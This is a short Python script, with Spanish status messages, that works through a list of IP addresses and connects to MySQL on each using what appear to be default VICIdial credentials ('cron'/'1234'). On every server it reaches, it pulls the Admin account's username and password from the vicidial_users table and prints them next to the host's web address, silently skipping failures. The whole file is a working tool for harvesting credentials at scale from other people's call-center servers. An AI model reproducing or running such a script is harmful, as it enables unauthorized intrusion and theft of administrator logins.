import mysql.connector
import sys
from colorama import Fore, Style

print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print(" ")
print("Conectadose a los servidores realizando query, timeout de 3 segundos ")
print(" ")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


def dbsize():
	with open("ips2.txt", "r") as a_file:
		for line in a_file:
			ipline = line.strip()
			try:
				mydb = mysql.connector.connect(host=ipline,
				                               user="cron",
				                               password="1234",
				                               database="asterisk",
				                               connection_timeout=3)
				mycursor = mydb.cursor(buffered=True)
				query = "SELECT full_name,user,pass FROM vicidial_users WHERE full_name='Admin';"
				mycursor.execute(query)
				myresult = mycursor.fetchall()
				print(str(myresult)+" "+str(ipline)+" "+"http://"+str(ipline))
			except:
				pass
dbsize()
